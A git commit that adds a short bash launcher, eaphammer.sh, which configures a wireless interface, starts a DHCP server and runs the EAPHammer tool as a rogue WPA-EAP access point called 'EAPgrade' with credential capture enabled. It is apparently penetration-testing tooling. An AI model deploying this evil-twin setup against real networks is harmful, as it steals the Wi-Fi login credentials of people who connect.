20efcff7a27771e9a5d43096ff2a8160439c87d7
mamatb <amatbaeza@gmail.com>
2019-10-11 21:19:07 +0000

    eaphammer.sh initial version

---
+++ eaphammer.sh
@@ -0,0 +1,19 @@
+#!/usr/bin/env bash
+
+# wireless interface selection
+INTERFACE='wlan0'
+if [ -d '/sys/class/net/wlan1/' ]
+then
+	INTERFACE='wlan1'
+fi
+
+# static ip configuration
+ifconfig "${INTERFACE}" down
+ifconfig "${INTERFACE}" '10.0.0.1' netmask '255.255.255.0' up
+
+# dnsmasq launch
+dnsmasq --interface="${INTERFACE}" --except-interface='lo' --bind-interfaces --dhcp-range='10.0.0.2,10.0.0.16,12h'
+
+# eaphammer launch
+cd '/opt/eaphammer/'
+./eaphammer -i "${INTERFACE}" --channel '1' --auth 'wpa-eap' --creds --hw-mode 'g' --essid 'EAPgrade' 2>&1 >> '/opt/eaphammer/logs/hostapd-eaphammer.raw'
